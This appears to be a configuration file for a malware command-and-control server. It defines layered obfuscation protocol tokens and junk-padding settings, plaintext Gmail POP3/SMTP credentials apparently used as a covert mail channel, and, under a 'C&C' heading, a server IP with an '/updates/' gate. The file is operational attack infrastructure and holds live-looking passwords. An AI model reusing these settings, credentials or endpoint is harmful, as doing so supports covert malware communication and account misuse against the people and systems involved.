# Server UID
SERVER_UID = 45158729

# Setup Logging system #########################################
#
import os
from FileConsoleLogger import FileConsoleLogger

ServerLogger = FileConsoleLogger( os.path.join(os.path.dirname(os.path.abspath(__file__)), "_w3server.log") )
W3Logger = FileConsoleLogger( os.path.join(os.path.dirname(os.path.abspath(__file__)), "_w3.log") )
#

# Setup Level 2 Protocol - P2Scheme #########################################
#
from P2Scheme import P2Scheme
P2_URL_TOKEN = '760e25f9eb3124'.decode('hex')
P2_SUBJECT_TOKEN = '\x55\xaa\x63\x68\x69\x6e\x61'
P2_DATA_TOKEN = '\x55\xaa\x63\x68\x69\x6e\x61'

# P2_DATA_TOKEN = 'd85a8c54fbe5e6'.decode('hex')
MARK = 'itwm='
B64_JUNK_LEN = 9
BIN_JUNK_LEN = 4


P2_Scheme = P2Scheme(_url_token=P2_URL_TOKEN, _data_token=P2_DATA_TOKEN, _mark=MARK, _subj_token=P2_SUBJECT_TOKEN,\
                     _b64junk_len=B64_JUNK_LEN, _binary_junk_len=BIN_JUNK_LEN)
#

# Setup Level 3 Protocol - P3Scheme #########################################
#
from P3Scheme import P3Scheme
#
P3_PRIVATE_TOKEN = 'a20e25f9aa3fe4'.decode('hex')
P3_SERVICE_TOKEN = '015a1354acf1b1'.decode('hex')
#
P3_Scheme = P3Scheme(private_token=P3_PRIVATE_TOKEN, service_token=P3_SERVICE_TOKEN)
#

# Setup HTTP checker
#
#from HTTPHeadersChecker import HTTPHeadersChecker
#
#HTTPChecker = HTTPHeadersChecker()

# Setup LocalStorage
#
from FSLocalStorage import FSLocalStorage
LocalStorage = FSLocalStorage()

############################################################
# Initialize Server instance #
#
#from W3Server import W3Server
#MAIN_HANDLER = W3Server(p2_scheme=P2_Scheme, p3_scheme=P3_Scheme, http_checker=HTTPChecker, local_storage=LocalStorage, logger=ServerLogger)
############################################################

# Mail Parameters
POP3_MAIL_IP = 'pop.gmail.com'
POP3_PORT = 995
POP3_ADDR = 'jassnovember30@gmail.com'
POP3_PASS = '30Jass11'

SMTP_MAIL_IP = 'smtp.gmail.com'
SMTP_PORT = 587
SMTP_TO_ADDR = 'userdf783@mailtransition.com'
SMTP_FROM_ADDR = 'ginabetz75@gmail.com'
SMTP_PASS = '75Gina75'


# C&C Parametrs
#
XAS_IP = '104.152.187.66'
XAS_GATE = '/updates/'

############################################################
# Setup P3 communication
# wsgi2
#
LS_TIMEOUT = 1 # big loop timeout
FILES_PER_ITER = 5 # count of requests per iter
############################################################
